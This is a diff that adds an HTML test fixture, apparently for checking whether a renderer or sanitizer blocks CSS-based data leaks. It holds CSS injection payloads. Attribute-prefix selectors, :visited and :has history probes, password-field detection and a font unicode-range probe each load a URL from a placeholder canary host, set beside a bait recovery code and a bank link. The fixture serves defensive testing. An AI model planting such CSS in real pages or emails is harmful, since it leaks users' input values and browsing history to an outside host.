@@ -1,0 +1,21 @@
+<style>
+  input[value^="a"] { background: url({{CANARY}}/{{ID}}/value-starts-a); }
+  input[value^="b"] { background: url({{CANARY}}/{{ID}}/value-starts-b); }
+  input[type="password"] { background: url({{CANARY}}/{{ID}}/password-field); }
+  a[href^="https://bank.example"] { background: url({{CANARY}}/{{ID}}/visited-bank); }
+  a:visited { background: url({{CANARY}}/{{ID}}/visited); }
+  a:link { background: url({{CANARY}}/{{ID}}/link); }
+  a:visited + span { background: url({{CANARY}}/{{ID}}/visited-sibling); }
+  input:checked + label { background: url({{CANARY}}/{{ID}}/checked); }
+  input:valid { background: url({{CANARY}}/{{ID}}/valid); }
+  p:has(a:visited) { background: url({{CANARY}}/{{ID}}/has-visited); }
+  @font-face { font-family: probe; src: url({{CANARY}}/{{ID}}/font-probe); unicode-range: U+0041; }
+  .probe { font-family: probe, serif; }
+  .scroll-probe::-webkit-scrollbar { background: url({{CANARY}}/{{ID}}/scrollbar); }
+  :target { background: url({{CANARY}}/{{ID}}/target); }
+  *::selection { background: url({{CANARY}}/{{ID}}/selection); }
+  textarea[value]:placeholder-shown { background: url({{CANARY}}/{{ID}}/placeholder); }
+</style>
+<p>Your recovery code is below. Keep it somewhere safe.</p>
+<p>Code: <input value="a1b2c3" type="text"> <a href="https://bank.example/login">bank.example</a><span>after</span></p>
+<p class="probe">Probe text ABC</p>
